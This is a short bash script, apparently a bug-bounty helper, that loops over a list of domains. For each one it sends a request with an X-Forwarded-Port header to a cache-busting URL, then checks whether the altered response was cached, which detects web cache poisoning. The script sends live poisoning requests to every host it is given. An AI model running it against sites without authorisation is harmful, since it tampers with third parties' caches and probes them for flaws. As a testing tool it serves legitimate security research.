#!/bin/bash
# author: sambal0x
# Purpose: To quickly check for potential cache poisoning issues for a list of URLs
#          This just assumes that the unkeyed parameter is X-Forwarded-Port, but its just to check for low hanging fruits
#          Disclaimer : Use at your own risk!
#
#################################################

for domain in $(cat $1); do 
	baseline=$(curl -s -o /dev/null -w "%{http_code}" http://$domain?baseline=1)  # baseline
	s1=$(curl -k -s -o /dev/null -w "%{http_code}" -H 'X-Forwarded-Port: 123' http://$domain?dontpoisoneveryone=1) # send poison req
	s2=$(curl -k -s -o /dev/null -w "%{http_code}" http://$domain?dontpoisoneveryone=1) # check poison req
	echo "http://$domain, $baseline,$s1, $s2"

	if [ "$baseline" != "$s1" ] && [ "$s1" == "$s2" ]; then   # if baseline and poison request not same, and poison request is confirmed -> potentiall vulnerable
		echo "[+] http://$domain is Potentially Vulnerable"
	fi
done
